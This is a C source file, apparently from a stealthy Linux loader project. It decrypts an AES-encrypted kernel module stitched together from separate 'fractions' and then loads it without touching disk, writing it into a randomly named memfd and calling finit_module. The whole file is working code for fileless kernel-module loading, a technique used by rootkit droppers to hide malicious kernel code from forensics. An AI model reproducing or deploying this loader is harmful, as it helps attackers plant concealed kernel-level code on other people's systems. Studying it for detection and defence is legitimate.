#include "../include/load.h"
#include "../include/cipher.h"
#include "../include/utils.h"
#define _GNU_SOURCE
#include <linux/memfd.h>
#include <linux/module.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdlib.h>
#include <string.h>

uint8_t *decrypt_lkm(fraction_t *fractions, int fractions_count, ssize_t *len, unsigned char *key) {

  uint8_t *module = NULL;
  ssize_t total_size = 0;
  ssize_t module_size = 0;
  ssize_t ret;

  for (int i = 0; i < fractions_count; i++) {
    total_size += fractions[i].data_size;
  }

  // total_size at this point is the size of all the cipher text which is
  // bigger than the size of the LKM
  module = malloc(total_size);

  if (module == NULL) {
    log_error("Could not allocate memory for LKM");
    return NULL;
  }

  for (int i = 0; i < fractions_count; i++) {
    ret = aes_decrypt(fractions[i].data, fractions[i].data_size, key,
                         fractions[i].iv, module + module_size);
    if (ret < 0) {
      log_error("Could not decrypt fraction at index %d", i);
      free(module);
      return NULL;
    }
    module_size += ret;
    log_debug("Decrypted fraction %d, current module size %ld", i, module_size);
  }

  log_debug("Decrypted LKM. LKM size = %ld bytes, buffer size = %ld bytes, "
            "wasted = %ld bytes",
            module_size, total_size, total_size - module_size);

  *len = module_size;
  return module;
}

int load_lkm(const uint8_t *lkm, ssize_t total_size) {
  int fdlkm;
  ssize_t written_bytes;
  char *filename;

  filename = generate_random_string();

  log_debug("Using random filename %s", filename);
  
  fdlkm = syscall(SYS_memfd_create, filename, 0);

  free(filename);
  
  if (fdlkm < 0) {
    log_error("memfd_create failed");
    return -1;
  }

  written_bytes = write(fdlkm, lkm, total_size);
  if (written_bytes < 0) {
    log_error("Error writing to memfd");
    close(fdlkm);
    return -1;
  }
  
  if (written_bytes != total_size) {
    log_error("Incomplete write to memfd (Expected %zu, wrote %zd)", total_size,
              written_bytes);
    close(fdlkm);
    return -1;
  }

  if (syscall(SYS_finit_module, fdlkm, "", 0) != 0) {
    log_error("Failed to init module");
    close(fdlkm);
    return -1;
  }

  log_debug("Module loaded successfully");
  close(fdlkm);

  return 0;
}
